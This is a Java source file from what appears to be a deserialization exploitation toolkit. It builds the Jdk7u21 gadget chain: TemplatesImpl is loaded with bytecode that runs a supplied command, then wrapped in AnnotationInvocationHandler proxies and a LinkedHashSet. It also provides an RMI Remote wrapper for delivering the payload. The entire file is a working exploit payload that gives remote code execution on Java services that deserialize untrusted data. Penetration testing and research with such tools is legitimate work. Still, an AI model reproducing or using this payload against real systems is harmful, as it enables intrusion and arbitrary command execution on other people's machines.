package payload;

import util.Reflections;
import util.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class Jdk7u21 implements PayloadType {
    @Override
    public HashSet getObject(String command, Boolean flag, String... args) throws Exception {
        byte[] classBytes = Utils.getPayloadByte(command, flag, args);

        TemplatesImpl impl = new TemplatesImpl();
        Reflections.setFieldValue(impl, "_bytecodes", new byte[][]{classBytes});
        Reflections.setFieldValue(impl, "_name", "testTemplatesImpl");
        Reflections.setFieldValue(impl, "_tfactory", new TransformerFactoryImpl());

        HashMap map = new HashMap();
        map.put("f5a5a608", "foo");

        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);

        Templates proxy = (Templates) Proxy.newProxyInstance(Jdk7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);

        HashSet hashSet = new LinkedHashSet();
        hashSet.add(impl);
        hashSet.add(proxy);

        map.put("f5a5a608", impl);
        return hashSet;
    }

    @Override
    public Remote getRemoteObject(String command) throws Exception {
        HashSet hashset = getObject(command, false);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        Map map1 = Reflections.createMap("handlerHashset", hashset);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, map1);

        Remote remote = Remote.class.cast(Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[]{Remote.class}, handler));
        return remote;
    }
}
